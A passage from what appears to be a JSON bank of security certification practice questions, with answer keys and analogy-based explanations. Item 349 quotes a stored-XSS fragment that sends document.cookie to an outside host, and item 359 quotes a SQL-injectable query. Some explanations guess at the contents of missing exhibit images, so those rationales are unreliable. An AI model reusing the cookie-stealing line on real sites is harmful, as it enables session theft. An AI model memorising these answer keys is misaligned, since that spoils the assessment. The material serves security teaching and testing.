RACI meeting does not prove a restore.","choose":1,"pbq":false,"exhibits":[]},{"id":331,"domain":4,"stem":"A security engineer reviews the SIEM logs after a server crash. The following list of events represents the timeline of actions collected from the SIEM: Which of the following best describes this type of attack?","options":{"A":"Lateral movement","B":"Credential dumping","C":"Data exfiltration","D":"LOLBin use"},"answer":"B","explanation":"The SIEM timeline is secrets coming out of LSASS or a similar store — hashes and tickets leaving memory. That is credential dumping.\n\nImagine someone photocopying every spare key on the office pegboard.","choose":1,"pbq":false,"exhibits":["exhibits/q331_1.png"]},{"id":332,"domain":3,"stem":"An organization hires a security consultant to establish a SOC that includes a threat-modeling function. During initial activities, the consultant works with system engineers to identify antipatterns within the environment. Which of the following is most critical for the engineers to disclose to the consultant during this phase?","options":{"A":"Results from the most recent infrastructure access review","B":"A listing of unpatchable IoT devices in use in the data center","C":"Network and data flow diagrams covering the production environment","D":"Results from the most recent software composition analysis","E":"A current inventory of cloud resources and SaaS products in use"},"answer":"C","explanation":"Threat modeling starts with how data and packets actually move. Network and data-flow diagrams are the map the consultant needs first.\n\nImagine asking a plumber for the pipe drawing of the house before you argue about which brand of faucet is installed.","choose":1,"pbq":false,"exhibits":[]},{"id":333,"domain":3,"stem":"In a recent audit, several critical legacy systems, which are externally exposed so that a specific vendor can manage them remotely, were identified. These systems must remain available to the vendor for the next six months. A security team segmented the network so these systems can only communicate with internal resources. Which of the following actions would be most appropriate to restore the vendor's access to manage these systems?","options":{"A":"Disable all connections to the systems, and implement a backup solution to capture the needed data to send to the vendor on a weekly basis.","B":"Create a VPN connection and set up firewall rules so only specific connections are allowed to those systems.","C":"Disable external connections to those systems for the next six months.","D":"Isolate the critical systems so they can only be remotely managed from the internet."},"answer":"B","explanation":"The vendor still needs in for six months. A tightly scoped VPN plus firewall allow-list keeps that remote path and drops the old “open to the internet” exposure.\n\nImagine giving the elevator technician a time-boxed badge to one machine room instead of leaving the alley door unlocked.","choose":1,"pbq":false,"exhibits":[]},{"id":334,"domain":4,"stem":"While investigating an email server that crashed, an analyst reviews the following log files: Which of the following is most likely the root cause?","options":{"A":"The administrator's account credentials were intercepted and reused.","B":"The backup process did not complete and caused cascading failure.","C":"A hardware failure in the storage array caused the mailboxes to be inaccessible.","D":"A user with low privileges was able to escalate and erase all mailboxes."},"answer":"D","explanation":"The crash log shows a low-privilege mailbox user who obtained admin rights and wiped stores. That is privilege escalation plus destruction.\n\nImagine an intern badge that suddenly opened the executive shredder room and emptied it.","choose":1,"pbq":false,"exhibits":["exhibits/q334_1.png"]},{"id":335,"domain":4,"stem":"An incident response analyst finds the following content inside of a log file that was collected from a compromised server: Which of the following is the best action to prevent future compromise?","options":{"A":"Blocking the processing of external files by forwarding them to another server for processing","B":"Implementing an allow list for all text boxes throughout the web application","C":"Filtering inserted characters for all user inputs and allowing only ASCII characters","D":"Improving file-parsing capabilities to stop external entities from executing commands"},"answer":"D","explanation":"The log is an XML external entity (XXE) or similar parser abuse: the app fetched a hostile outside file while reading XML. Harden the parser so external entities will not run.\n\nImagine a clerk who was told “read this form” and instead opened a poisoned envelope stapled to it.","choose":1,"pbq":false,"exhibits":["exhibits/q335_1.png"]},{"id":336,"domain":4,"stem":"A company isolates its ОТ systems from other areas of the corporate network. These systems are required to report usage information over the internet to the vendor. Which of the following best prevents compromise or sabotage? (Choose two.)","options":{"A":"Implementing allow lists","B":"Monitoring network behaviors","C":"Encrypting data at rest","D":"Performing boot integrity checks","E":"Executing daily health checks","F":"Implementing a site-to-site IPSec VPN"},"answer":"A,F","explanation":"OT must phone the vendor and must not become a beachhead. Allow-list the few destinations and wrap that path in a site-to-site IPsec VPN.\n\nImagine a factory fax that only talks to the machine vendor’s number, and only through a locked courier pouch.","choose":2,"pbq":false,"exhibits":[]},{"id":337,"domain":2,"stem":"An organization is implementing Zero Trust architecture. A systems administrator must increase the effectiveness of the organization's context-aware access system. Which of the following is the best way to improve the effectiveness of the system?","options":{"A":"Secure zone architecture","B":"Always-on VPN","C":"RADIUS","D":"Microsegmentation"},"answer":"D","explanation":"Zero Trust context-aware access gets sharper when east-west paths are small. Microsegmentation is that shrink.\n\nAn always-on VPN still trusts a big inside.\n\nImagine re-checking a key at every floor, which only works if each floor has its own door.","choose":1,"pbq":false,"exhibits":[]},{"id":338,"domain":2,"stem":"A company plans to deploy a new online application that provides video training for its customers. As part of the design, the application must be: • Fast for all users • Available for users worldwide • Protected against attacks Which of the following are the best components the company should use to meet these requirements? (Choose two.)","options":{"A":"WAF","B":"IPS","C":"CDN","D":"SASE","E":"VPN","F":"CASB"},"answer":"A,C","explanation":"Worldwide, fast, and protected video: CDN for speed and reach, WAF for web attacks.\n\nA staff VPN does not serve global customers. IPS and CASB are the wrong layer for this design pair.\n\nImagine neighborhood theaters plus a doorman who checks tickets, not a company shuttle.","choose":2,"pbq":false,"exhibits":[]},{"id":339,"domain":3,"stem":"During a security review for the CI/CD process, a security engineer discovers the following information in a testing repository from the company: Which of the following options is the best countermeasure to prevent this issue in the future?","options":{"A":"Performing an application penetration test over the testing environment before moving to production","B":"Changing the repository technology to avoid inclusion of confidential information","C":"Automating the upload process of code to the repository and improving the software development life cycle","D":"Using a secrets management platform to share and manage confidential information"},"answer":"D","explanation":"The test repo contains live secrets. Move those values into a secrets manager and inject them at run time so future commits cannot leak passwords.\n\nImagine stopping the habit of taping the spare house key to the fridge photo you share in the family chat.","choose":1,"pbq":false,"exhibits":["exhibits/q339_1.png"]},{"id":340,"domain":1,"stem":"A company must meet the following security requirements when implementing controls in order to be compliant with government policy: • Access to the system document repository must be MFA enabled. • Ongoing risk monitoring must be displayed on a system dashboard. • Staff must receive email notifications about periodic tasks. Which of the following best meets all of these requirements?","options":{"A":"Implementing a GRC tool","B":"Configuring a privileged access management system","C":"Launching a vulnerability management program","D":"Creating a risk register"},"answer":"A","explanation":"MFA on a document library, a live risk dashboard, and email task nags are the daily jobs of a GRC platform.\n\nPAM holds admin creds. A vulnerability program finds CVEs. A register is a list.\n\nImagine one clipboard app that holds the policy, the tasks, and the wall chart the board walks past.","choose":1,"pbq":false,"exhibits":[]},{"id":341,"domain":3,"stem":"Based on the results of a SAST report on a legacy application, a security engineer is reviewing the following snippet of code flagged as vulnerable: Which of the following is the vulnerable line of code that must be changed?","options":{"A":"Line [02]","B":"Line [04]","C":"Line [07]","D":"Line [08]","E":"Line [10]"},"answer":"E","explanation":"SAST flagged one line in the snippet — usually a raw string concat, unbounded copy, or eval. Change that exact line (line 10 in this item) so user data cannot become code or smash the buffer.\n\nImagine circling the one sentence on a form that lets someone write extra instructions in the margin, then rewriting that sentence.","choose":1,"pbq":false,"exhibits":["exhibits/q341_1.png"]},{"id":342,"domain":3,"stem":"A company detects suspicious activity associated with inbound connections. Security detection tools are unable to categorize this activity. Which of the following is the best solution to help the company overcome this challenge?","options":{"A":"Implement an interactive honeypot.","B":"Map network traffic to known IoCs.","C":"Monitor the dark web.","D":"Implement UEBA."},"answer":"D","explanation":"Inbound sessions that no signature tool can name are a behavior problem. UEBA learns normal user and host patterns and flags the odd connection even without a catalog name.\n\nImagine a doorman who does not have a mugshot but notices a guest who keeps arriving at 3 a.m. with a dolly.","choose":1,"pbq":false,"exhibits":[]},{"id":343,"domain":2,"stem":"After discovering that an employee is using a personal laptop to access highly confidential data, a systems administrator must secure the company's data. Which of the following capabilities best addresses this situation?","options":{"A":"OCSP stapling","B":"CASB","C":"SOAR","D":"Conditional access","E":"Package monitoring"},"answer":"D","explanation":"A personal laptop on highly confidential data. Conditional access can demand a managed device before the data opens.\n\nCASB watches SaaS. OCSP is cert status.\n\nImagine a badge that will not open the vault unless it is clipped to a company lanyard.","choose":1,"pbq":false,"exhibits":[]},{"id":344,"domain":1,"stem":"An organization is increasing its focus on training that addresses new social engineering and phishing attacks. Which of the following is the organization MOST concerned about?","options":{"A":"Meeting existing regulatory compliance","B":"Overreliance on AI support bots","C":"Generative AI tools increasing the quality of exploits","D":"Differential analysis using AI models"},"answer":"C","explanation":"New phish and social-engineering quality is being raised by generative AI: better grammar, better fake faces, better lures.\n\nThat is the concern driving extra training.\n\nImagine scam letters that no longer have typos. The old 'look for bad English' lesson dies.\n\nCompliance and bot overuse are other worries.","choose":1,"pbq":false,"exhibits":[]},{"id":345,"domain":2,"stem":"An engineer wants to automate several tasks by running commands daily on a UNIX server. The engineer has only built-in, default tools available. Which of the following should the engineer use to best assist with this effort? (Choose two.)","options":{"A":"Python","B":"Cron","C":"Ansible","D":"PowerShell","E":"Bash","F":"Task Scheduler"},"answer":"B,E","explanation":"Daily commands on a stock UNIX box: cron to schedule, bash to run. Task Scheduler and PowerShell are Windows. Ansible is extra software.\n\nImagine an alarm clock plus the tools already in the kitchen drawer.","choose":2,"pbq":false,"exhibits":[]},{"id":346,"domain":4,"stem":"A security engineer discovers that some legacy systems are still in use or were not properly decommissioned. After further investigation, the engineer identifies that an unknown and potentially malicious server is also sending emails on behalf of the company. The security engineer extracts the following data for review: Which of the following actions should the security engineer take next? (Choose two.)","options":{"A":"Rotate the DKIM selector to use another key.","B":"Change the DMARC policy to reject and remove references to the server.","C":"Remove the unnecessary servers from the SPF record.","D":"Change the SPF record to enforce the hard fail parameter.","E":"Update the MX record to contain only the primary email server.","F":"Change the DMARC policy to none and monitor email flow to establish a new baseline."},"answer":"B,D","explanation":"A rogue server is sending mail as you. Tighten SPF to -all (hard fail) so only listed senders pass, and set DMARC to reject while dropping the rogue host from the record.\n\nImagine telling the post office: only these two printers may use our letterhead, and dump any other copy.","choose":2,"pbq":false,"exhibits":["exhibits/q346_1.png"]},{"id":347,"domain":1,"stem":"An organization recently implemented a new email DLP solution. Emails sent from company email addresses to matching personal email addresses generated a large number of alerts, but the content of the emails did not include company data. The security team needs to reduce the number of emails sent without blocking all emails to common personal email services. Which of the following should the security team implement first?","options":{"A":"Automatically quarantine outgoing email.","B":"Create an acceptable use policy.","C":"Enforce email encryption standards.","D":"Perform security awareness training focusing on phishing."},"answer":"B","explanation":"Staff are mailing themselves from work to personal accounts with no company data. That is a behavior question before it is a block rule.\n\nWrite an acceptable-use rule for that path, then tune DLP.\n\nImagine a sign that says 'do not forward work mail to your kitchen PC' before you padlock the mailbox.\n\nQuarantine-all would stop the work. Encryption does not stop the extra copy.","choose":1,"pbq":false,"exhibits":[]},{"id":348,"domain":3,"stem":"A systems administrator is working with clients to verify email-based services are performing properly. The administrator wants to have the email server digitally sign outbound emails using the organization's private key. Which of the following should the systems administrator configure?","options":{"A":"SPF","B":"DKIM","C":"DMARC","D":"TLS"},"answer":"B","explanation":"Digitally signing outbound mail with the domain’s private key is DKIM. Receivers check the signature against the public key in DNS.\n\nImagine stamping every letter with a wax seal only your office ring can make.","choose":1,"pbq":false,"exhibits":[]},{"id":349,"domain":3,"stem":"During a forensic review of a cybersecurity incident, a security engineer collected a portion of the payload used by an attacker on a comprised web server. Given the following portion of the code: ..asd...document.location=\"https://10.10.1.2/?\"\"+document.cookie; ..12..fa..<>...ash214%621...41..2...8.8. Which of the following best describes this incident?","options":{"A":"XSRF attack","B":"Command injection","C":"Stored XSS","D":"SQL injection"},"answer":"C","explanation":"The fragment writes document.cookie out to an attacker URL from a page the server stored. That is stored XSS — the script lives in the site and runs in every victim browser.\n\nImagine a guestbook that stores “please mail me your house key” and every later visitor’s browser obeys it.","choose":1,"pbq":false,"exhibits":[]},{"id":350,"domain":3,"stem":"A company is migrating from a Windows Server to Linux-based servers. A security engineer must deploy a configuration management solution that maintains security software across all the Linux servers. Which of the following configuration file snippets is the MOST appropriate to use?","options":{"A":"Exhibit 1 — Linux config-management play (hosts: linux_servers, remote_user: root)","B":"Exhibit 2 — XML inventory / Canonical source snippet","C":"Exhibit 3 — Windows-oriented / malformed deployment JSON (Administrator, Microsoft Store)","D":"Exhibit 4 — Linux field names, but invalid JSON (missing separators)"},"answer":"A","explanation":"The fleet is now Linux, so the snippet must be a Linux configuration-management play (linux_servers, root) that can install and keep the security package current. Windows Administrator / Microsoft Store JSON and malformed XML do not maintain that estate.\n\nImagine swapping a fleet of diesel trucks for EVs and then using a charging schedule instead of a diesel-pump route sheet.","choose":1,"pbq":false,"exhibits":["exhibits/q350_1.png","exhibits/q350_2.png","exhibits/q350_3.png","exhibits/q350_4.png"]},{"id":351,"domain":2,"stem":"A pharmaceutical lab hired a consultant to identify potential risks associated with Building 2, a new facility that is under construction. The consultant received the IT project plan, which includes the following VLAN design: Which of the following TTPs should the consultant recommend be addressed first?","options":{"A":"Zone traversal","B":"Unauthorized execution","C":"Privilege escalation","D":"Lateral movement"},"answer":"A","explanation":"A new building VLAN plan that lets lab, business, and guest jump zones is zone traversal first — the TTP to kill before lateral movement inside a zone.\n\nImagine locking the stairwell between floors before you worry about who walks a single hallway.","choose":1,"pbq":false,"exhibits":["exhibits/q351_1.png"]},{"id":352,"domain":3,"stem":"Previously intercepted communications must remain secure even if a current encryption key is compromised in the future. Which of the following best supports this requirement?","options":{"A":"Tokenization","B":"Key stretching","C":"Forward secrecy","D":"Simultaneous authentication of equals"},"answer":"C","explanation":"Forward secrecy (ephemeral Diffie-Hellman) makes a new session key every conversation. Stealing today’s long-term key does not unlock last year’s recordings.\n\nImagine a hotel safe whose combination is thrown away at checkout; stealing the front-desk master later does not open last month’s boxes.","choose":1,"pbq":false,"exhibits":[]},{"id":353,"domain":3,"stem":"A security engineer wants to stay up-to-date on new detections that are released on a regular basis. The engineer's organization uses multiple tools rather than one specific vendor security stack. Which of the following rule-based languages is the MOST appropriate to use as a baseline for detection rules with the multiple security tool setup?","options":{"A":"Sigma","B":"YARA","C":"Snort","D":"Rita"},"answer":"A","explanation":"Sigma is a vendor-neutral detection language you can translate into Splunk, Elastic, QRadar, and others. YARA is files; Snort is packets.\n\nImagine writing one recipe card that any chain restaurant can cook on its own stove.","choose":1,"pbq":false,"exhibits":[]},{"id":354,"domain":4,"stem":"A security engineer is developing a solution to meet the following requirements: • All endpoints should be able to establish telemetry with a SIEM. • All endpoints should be able to be integrated into the XDR platform. • SOC services should be able to monitor the XDR platform. Which of the following should the security engineer implement to meet the requirements? (Choose two.)","options":{"A":"EDR","B":"HIDS","C":"Web application firewall","D":"Central logging","E":"Host-based firewall","F":"TPM"},"answer":"A,D","explanation":"Endpoints need an EDR agent to talk to XDR, and they need a central log path so the SIEM and SOC see the same telemetry. Those two pieces satisfy the three bullets.\n\nImagine every store radioing a district dispatcher and also dropping a paper copy of the shift log in the same inbox.","choose":2,"pbq":false,"exhibits":[]},{"id":355,"domain":2,"stem":"A security engineer needs to create multiple servers in a company's private cloud. The servers should have a virtual network infrastructure that supports connectivity, as well as security configurations applied using predefined templates. Which of the following is the best option for the security engineer to consider for the deployment?","options":{"A":"Installing a container orchestration solution locally, configuring the infrastructure, and cloning the solution","B":"Creating templates on the cloud provider marketplace and modeling the solution using those templates","C":"Using Terraform to implement an infrastructure as code model with the existing private cloud solution","D":"Integrating the cloud provider API to the CI/CD pipeline model used by the company"},"answer":"C","explanation":"Private cloud, virtual nets, security from templates: Terraform as IaC on what you already own.\n\nMarketplace templates are public-cloud shopping. Cloning containers locally is not the network-plus-template ask.\n\nImagine a blueprint that builds the same locked house every time you press print.","choose":1,"pbq":false,"exhibits":[]},{"id":356,"domain":3,"stem":"A company must build and deploy security standards for all servers in its on-premises and cloud environments based on hardening guidelines. Which of the following solutions most likely meets the requirements?","options":{"A":"Develop a security baseline to integrate with the vulnerability scanning platform to alert about any server not aligned with the new security standards.","B":"Create baseline images for each OS in use, following security standards, and integrate the images into the patching and deployment solution.","C":"Build all new images from scratch, installing only needed applications and modules in accordance with the new security standards.","D":"Run a script during server deployment to remove all the unnecessary applications as part of provisioning."},"answer":"B","explanation":"A golden image per OS, built to the hardening guide and wired into deploy-and-patch, makes every new server start compliant and stay patchable. Scanning after the fact only reports drift.\n\nImagine a cookie cutter that already has the right shape, instead of baking blobs and then trimming each one.","choose":1,"pbq":false,"exhibits":[]},{"id":357,"domain":2,"stem":"A company is planning to migrate all of its on-site-hosted applications to a public cloud provider. Which of the following is the best way to reduce the scope of security-relevant work that the company must address after the applications have been migrated to the cloud?","options":{"A":"Adopting cloud-native security solutions","B":"Using a microservices architecture","C":"Performing a lift-and-shift cloud migration","D":"Implementing serverless cloud services"},"answer":"D","explanation":"After the move, the least leftover security work is serverless: the provider runs more of the stack.\n\nLift-and-shift carries your old OS duty with you.\n\nImagine hiring a caterer instead of moving your whole kitchen and still washing the pans.","choose":1,"pbq":false,"exhibits":[]},{"id":358,"domain":3,"stem":"A security architect must implement security controls in a software development life cycle for an internally developed application. The architect must identify the components that were used to create the application. Which of the following should the security architect use to meet this requirement?","options":{"A":"A/B test","B":"SAST","C":"IAST","D":"SBoM"},"answer":"D","explanation":"A software bill of materials lists every library and component that went into the build. That is how you know what you shipped.\n\nImagine a recipe card taped to the cake box so you can pull it if one spice is recalled.","choose":1,"pbq":false,"exhibits":[]},{"id":359,"domain":3,"stem":"A security analyst collects the logs from the web server that is associated with a security incident. The analyst finds the following entry in the logs: SELECT user FROM Customers WHERE userID = \"SRequest(userID)\" Which of the following will prevent this incident from reoccurring?","options":{"A":"URL encoding","B":"Query parameterization","C":"Data sanitization","D":"SQL output encoding"},"answer":"B","explanation":"The log is SQL built from a request field. Parameterization keeps the command and the user value in separate buckets so typed text cannot change the query.\n\nImagine a waiter who writes your order on a ticket instead of letting you shout new instructions into the kitchen.","choose":1,"pbq":false,"exhibits":[]},{"id":360,"domain":3,"stem":"A security analyst discovers a compromised internal server and finds that the attack vector was an application. When extracting a memory dump with the application process content, the analyst observes the following: Which of the following solutions should the analyst recommend to best address this issue and avoid reoccurrence?","options":{"A":"Implement address space layout randomization and canary stacks.","B":"Reduce the buffer size to allow for less stored data.","C":"Improve character filtering and input validation for user inputs.","D":"Allow only the use of digitally signed and validated libraries."},"answer":"A","explanation":"The memory dump is a smashed stack or dumped return address — a memory-corruption exploit. ASLR plus stack canaries make those addresses and frames unpredictable.\n\nImagine shuffling the furniture and putting a tripwire on the safe so last week’s burglary map no longer works.","choose":1,"pbq":false,"exhibits":["exhibits/q360_1.png"]},{"id":361,"domain":3,"stem":"A security engineer is assisting a DevOps team that has the following requirements for container images: • Ensure container images are hashed and use version controls. • Ensure container images are up to date and scanned for vulnerabilities. Which of the following should the security engineer do to meet these requirements?","options":{"A":"Enable clusters on the container image and configure the mesh with ACLs.","B":"Enable new security and quality checks within a CI/CD pipeline.","C":"Enable audits on the container image and monitor for configuration changes.","D":"Enable pulling of the container image from the vendor repository and deploy directly to operations."},"answer":"B","explanation":"Hashing, version pins, freshness, and CVE scans on images belong in the CI/CD pipeline as mandatory gates before anything reaches the cluster.\n\nImagine a loading dock that weighs, labels, and inspects every crate before it goes into the warehouse.","choose":1,"pbq":false,"exhibits":[]},{"id":362,"domain":4,"stem":"A building camera is remotely accessed and disabled from the remote console application during off-hours. A security analyst reviews the following logs: Which of the following actions should the analyst take to best mitigate the threat?","options":{"A":"Implement WAF protection for the web application.","B":"Upgrade the firmware on the camera.","C":"Only allow connections from approved IPs.","D":"Block IP 104.18.16.29 on the firewall."},"answer":"C","explanation":"After-hours access from an unexpected network disabled the camera. Restrict the console to known admin IPs so a random internet host cannot reach the app.\n\nImagine a garage-door remote that only works when the car is on your driveway, not from the next zip code.","choose":1,"pbq":false,"exhibits":["exhibits/q362_1.png"]},{"id":363,"domain":3,"stem":"A company implements an AI model that handles sensitive and personally identifiable information. Which of the following threats is most likely the company's primary concern?","options":{"A":"Unsecured output handling","B":"Model theft","C":"Model poisoning","D":"Prompt injection"},"answer":"A","explanation":"An AI that prints PII can leak it in answers, logs, or screenshots. Unsecured output handling — not showing, storing, or forwarding raw sensitive fields — is the first privacy control.\n\nImagine a receptionist who must not repeat a caller’s Social Security number out loud in the lobby.","choose":1,"pbq":false,"exhibits":[]},{"id":364,"domain":2,"stem":"A security architect is establishing requirements to design resilience in an enterprise system that will be extended to the company's other physical locations. The system must: • Be survivable to one environmental catastrophe. • Be recoverable within 24 hours of critical loss of availability. • Be resilient to active exploitation of one site-to-site VPN solution. Which of the following design components best meet these requirements while upholding security? (Choose two.)","options":{"A":"Load-balance connection attempts and data egress at internet gateways.","B":"Allocate fully redundant and geographically distributed standby sites.","C":"Employ layering of routers from diverse vendors.","D":"Lease space to establish cold sites throughout other countries.","E":"Deploy redundant identity provider solutions.","F":"Implement full weekly backups to be stored off-site for each of the company's sites."},"answer":"B,E","explanation":"Survive one catastrophe, back in 24 hours, VPN exploit at one site: a second live geography plus a second identity system so login does not die with the first site.\n\nA cold site in another country may miss 24 hours. Weekly tapes may miss 24 hours.\n\nImagine a second shop in another town and a second set of keys, not a storage unit two countries away.","choose":2,"pbq":false,"exhibits":[]},{"id":365,"domain":3,"stem":"An engineer is designing a wireless access solution that must comply with the IEEE-specified security requirements for the 802.1X protocol. The engineer wants to streamline access by removing the need to provide a WPA2 PSK and domain credentials each time for access. Which of the following actions best meet this requirement? (Choose two.)","options":{"A":"Issuing client authentication certificates to devices","B":"Issuing a separate 32-bit key to wireless supplicants","C":"Configuring RADIUS with EAP-TLS","D":"Using a geofence over the facility and enforcing it for access","E":"Configuring RADIUS with EAP-PEAP","F":"Configuring RADIUS with EAP-FAST"},"answer":"A,C","explanation":"802.1X without a shared Wi-Fi password is EAP-TLS: each device presents a client certificate and RADIUS checks it. Users stop typing a PSK and domain password on every join.\n\nImagine a badge reader that accepts the chip in the card instead of a door code written on the wall.","choose":2,"pbq":false,"exhibits":[]},{"id":366,"domain":3,"stem":"An organization must provide access to its internal system data. The organization requires that this access complies with the following: • Access must be automated. • Data confidentiality must be preserved. • Access must be authenticated. • Data must be preprocessed before it is retrieved. Which of the following actions should the organization take to meet these requirements?","options":{"A":"Configure a reverse proxy to protect the data.","B":"Implement an on-demand VPN connection.","C":"Deploy an API gateway protected with access tokens.","D":"Continually publish all relevant data to a CDN."},"answer":"C","explanation":"Automated, authenticated, preprocessed data access is an API behind a gateway that demands access tokens and can transform the payload before it leaves.\n\nImagine a library desk that only hands out already-redacted photocopies to people who show a valid card.","choose":1,"pbq":false,"exhibits":[]},{"id":367,"domain":3,"stem":"Following a security incident, a company decides to improve its device management. The company establishes the following requirements for the new process: • EOL devices must be properly replaced in a timely manner. • Accurate, detailed information about the devices must be available in a centralized repository. Which of the following should the company do to meet these requirements? (Choose two.)","options":{"A":"Configure agent-based vulnerability scanning tools.","B":"Implement an asset management life cycle.","C":"Switch to a BYOD policy.","D":"Transition to a virtual desktop infrastructure.","E":"Establish a quality assurance program.","F":"Maintain a configuration management database."},"answer":"B,F","explanation":"EOL replacement and a single source of device truth are an asset life-cycle process plus a CMDB. Together they say what you own, how old it is, and when it must be swapped.\n\nImagine a fleet logbook that lists every van, its mileage, and the date it must be retired.","choose":2,"pbq":false,"exhibits":[]},{"id":368,"domain":3,"stem":"A security engineer needs to remediate a SWEET32 vulnerability in an OpenSSH-based application and review existing configurations. Which of the following should the security engineer do? (Choose two.)","options":{"A":"Disable Twofish algorithms","B":"cat /etc/sshd/ssh_config | grep \"HMAC\"","C":"Disable RSA algorithms","D":"cat /etc/sshd/ssh_config | grep \"PermitRootLogin\"","E":"Disable 3DES algorithms","F":"cat /etc/sshd/ssh_config | grep \"Ciphers\""},"answer":"E,F","explanation":"SWEET32 attacks birthday-collision on 64-bit block ciphers such as 3DES. Turn 3DES off and grep the SSH cipher list to prove what is still offered.\n\nImagine retiring a padlock whose YouTube picking video already has a million views, and then reading the lock list on the door to confirm it is gone.","choose":2,"pbq":false,"exhibits":[]},{"id":369,"domain":3,"stem":"A DevOps engineer sets up a CI/CD pipeline to deploy application container images in the Kubernetes production environment. The security engineer wants to prevent the deployment of unsecured images. Which of the following security solutions should the engineer use in the pipeline to meet this objective?","options":{"A":"Vulnerability scanning","B":"Static code analysis","C":"Trusted attestation","D":"Private repository"},"answer":"C","explanation":"Untrusted images must not reach prod. Trusted attestation (signed image plus a policy that only signed, scanned artifacts deploy) is the pipeline gate that enforces that.\n\nImagine a pharmacy that only stocks bottles whose factory seal and lot stamp both verify.","choose":1,"pbq":false,"exhibits":[]},{"id":370,"domain":2,"stem":"In order to follow new regulations, the Chief Information Security Officer plans to use a defense-in- depth approach for a perimeter network. Which of the following protections would best achieve this goal?","options":{"A":"SAST, DAST, IAST","B":"NGFW, IPS, EDR","C":"SASE, IDS, SAST","D":"CASB, DLP, EDR"},"answer":"B","explanation":"Perimeter defense-in-depth is layers on the path: NGFW, IPS, and EDR on the hosts.\n\nSAST is a code scan. SASE is user access. They are not this perimeter stack.\n\nImagine a locked gate, a guard in the driveway, and an alarm in each room.","choose":1,"pbq":false,"exhibits":[]},{"id":371,"domain":4,"stem":"Protected company data was recently exfiltrated. The SOC did not find any indication of a network or outside physical intrusion, and the DLP systems reported no unusual activity. The incident response team determined a text file was encrypted and reviews the following: Which of the following is the most appropriate action for the team to take?","options":{"A":"Review the email security settings for proper configurations.","B":"Investigate whether the employee had access to the data that was leaked.","C":"Scan attachments with a third-party virus scan to independently confirm the results.","D":"Analyze the hardware for undetected supply chain vulnerabilities that may have been exploited."},"answer":"B","explanation":"No network break-in and a quiet DLP plus an encrypted text file points at a person who already had the data. First ask whether that employee was allowed to hold it.\n\nImagine a missing cake and no broken window — you start by asking who had a kitchen key.","choose":1,"pbq":false,"exhibits":["exhibits/q371_1.png"]},{"id":372,"domain":1,"stem":"A security team is evaluating the following vulnerabilities in response to a third-party risk assessment: Given the following organizational policy requirements: • Any adjusted CVSS score of 7.0 or greater must be remediated within 15 days. • Any adjusted CVSS score of 6.9 or less must be remediated within 30 days. • Any vulnerability with a known public exploit must be remediated within seven days. • Any vulnerability that requires high privileges can have a lower severity. Which of the following actions should the analyst do to meet the requirements on time?","options":{"A":"Implement a patch for CVE-2025-1234.","B":"Accept risk for CVE-2022-5678.","C":"Make an exception within the insurance policy for CVE-2022-5678.","D":"Add CVE-2024-9123 to the risk register.","E":"Decommission the systems affected by CVE-2024-9123."},"answer":"A","explanation":"Policy says high adjusted CVSS and public-exploit bugs go first. The exhibit's urgent row is the CVE with a public exploit and a score that trips the seven-day clock.\n\nPatch that one now.\n\nImagine an emergency room that treats the patient who is bleeding and already has a published treatment protocol before the patient with a mild score and no playbook.\n\nInsurance exceptions and a register entry do not stop an exploit that is already public.","choose":1,"pbq":false,"exhibits":["exhibits/q372_1.png"]},{"id":373,"domain":4,"stem":"During an incident response activity, the response team collected some artifacts from a compromised server, but the following information is missing: • Source of the malicious files • Initial attack vector • Lateral movement activities The next step in the playbook is to reconstruct a timeline. Which of the following best supports this effort?","options":{"A":"Executing decompilation of binary files","B":"Analyzing all network routes and connections","C":"Performing primary memory analysis","D":"Collecting operational system logs and storage disk data"},"answer":"D","explanation":"You have malware bytes but not how they arrived or moved. OS logs and disk artifacts (prefetch, MFT, auth logs) are what rebuild that timeline.\n\nImagine a burglary where you only have the crowbar; the security-camera DVR and the muddy footprints tell you the path.","choose":1,"pbq":false,"exhibits":[]},{"id":374,"domain":3,"stem":"A Chief Information Security Officer is concerned about the operational impact of ransomware. In the event of a ransomware attack, the business requires the integrity of the data to remain intact and an RPO of less than one hour. Which of the following storage strategies best satisfies the business requirements?","options":{"A":"Full disk encryption","B":"Remote journaling","C":"Immutable","D":"RAID 10"},"answer":"C","explanation":"Ransomware that encrypts live disks loses if backups cannot be altered and you can roll back under an hour. Immutable storage (WORM / object-lock) keeps that last good copy honest.\n\nImagine a photo album in a fireproof box the thief cannot rewrite, with a copy made every 45 minutes.","choose":1,"pbq":false,"exhibits":[]},{"id":375,"domain":4,"stem":"A company wants to protect a web-based application against application-layer attacks by monitoring the inputs, outputs, and internal state of the application. The solution must also rapidly integrate with different programming languages. Which of the following technologies is most likely to meet this need?","options":{"A":"RASP","B":"Cloud-based IDE","C":"DAST","D":"NIPS"},"answer":"A","explanation":"Watching inputs, outputs, and internal state inside a running app, across languages, is RASP — the control lives in the process and can block the bad call.\n\nImagine a bartender who stands behind the bar and can knock a spiked drink out of a hand, not just a bouncer on the sidewalk.","choose":1,"pbq":false,"exhibits":[]},{"id":376,"domain":4,"stem":"A security architect performs a baseline review on the SIEM. The findings indicate that multiple use cases are missing and coverage is limited for defense evasion techniques. Which of the following processes best describes what the architect should do?","options":{"A":"Implement a TIP on the internal network to facilitate the creation of a use case.","B":"Perform a penetration test on critical devices and document IOCs for use cases.","C":"Create a list of use cases based on Snort detection rules.","D":"Use Sigma to build the logic of the use cases and testing on the SIEM."},"answer":"D","explanation":"Missing defense-evasion detections across several SIEM products are a content problem. Write them once in Sigma and test the translated rules in your SIEM.\n\nImagine one sheet-music arrangement that every house band can play on its own instruments.","choose":1,"pbq":false,"exhibits":[]},{"id":377,"domain":3,"stem":"A vulnerability scan was performed on a website, and the following encryption suites were found: Which of the following actions will remediate the vulnerability?","options":{"A":"Removing any ciphers utilizing cipher block chaining","B":"Rearranging the order of the ciphers from strongest to weakest","C":"Deploying a WAF to monitor web traffic","D":"Reissuing new SSL certificates for the website"},"answer":"A","explanation":"The report still lists CBC suites. SWEET32 and padding-oracle families live there; remove CBC ciphers so only AEAD suites remain.\n\nImagine taking the cheap padlocks off the gate after pickers published a video about that exact model.","choose":1,"pbq":false,"exhibits":["exhibits/q377_1.png"]},{"id":378,"domain":3,"stem":"A developer makes a small change to a resource allocation module on a popular social media website and causes a memory leak. During a peak utilization period, several web servers crash, causing the website to go offline. Which of the following testing techniques is the most efficient way to prevent this from reoccurring?","options":{"A":"Load","B":"Smoke","C":"Regression","D":"Canary"},"answer":"A","explanation":"A tiny leak became an outage only when traffic peaked. Load testing (and soak testing) would have shown the leak before customers did.\n\nImagine filling the new pool all the way before opening day, not just dipping a 